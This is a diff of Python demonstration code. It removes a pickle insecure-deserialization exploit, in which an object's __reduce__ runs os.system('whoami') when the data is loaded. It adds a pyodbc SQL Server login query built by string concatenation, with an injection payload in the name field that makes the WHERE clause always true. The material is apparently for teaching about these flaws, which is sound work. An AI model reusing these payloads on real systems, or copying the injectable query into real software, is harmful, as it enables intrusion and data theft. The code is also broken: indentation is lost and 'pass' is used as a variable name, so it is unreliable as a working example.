@@ -1,24 +1,25 @@
-# Import dependencies
-import os
-import _pickle
+import pyodbc
 
-# Attacker prepares exploit that application will insecurely deserialize
-class Exploit(object):
-def __reduce__(self):
-return (os.system, ('whoami',))
+instance = "<接続先のサーバー名>"
+user = "<ユーザー>"
+password = "<パスワード>"
+db = "<データベース名>"
 
-# Attacker serializes the exploit
-def serialize_exploit():
-shellcode = _pickle.dumps(Exploit())
-return shellcode
+#接続文字列の組み立て
+conn_str = "DRIVER={SQL Server};SERVER=" + instance + \
+     ";uid=" + user + \
+     ";pwd=" + password + \
+     ";DATABASE=" + db
 
-# Application insecurely deserializes the attacker's serialized data
-def insecure_deserialization(exploit_code):
-_pickle.loads(exploit_code)
+#データベースへ接続
+conn = pyodbc.connect(conn_str)
 
-if __name__ == '__main__':
-# Serialize the exploit
-shellcode = serialize_exploit()
+name="\" OR \"\"=\"\""
+pass="1234"
+sql = 'SELECT * FROM Users WHERE Name ="' + name + '" AND Pass ="' + pass + '"'
 
-# Attacker's payload runs a `whoami` command
-insecure_deserialization(shellcode)
+cursor = conn.cursor()
+cursor.execute(sql)
+rows = cursor.fetchall()
+cursor.close()
+
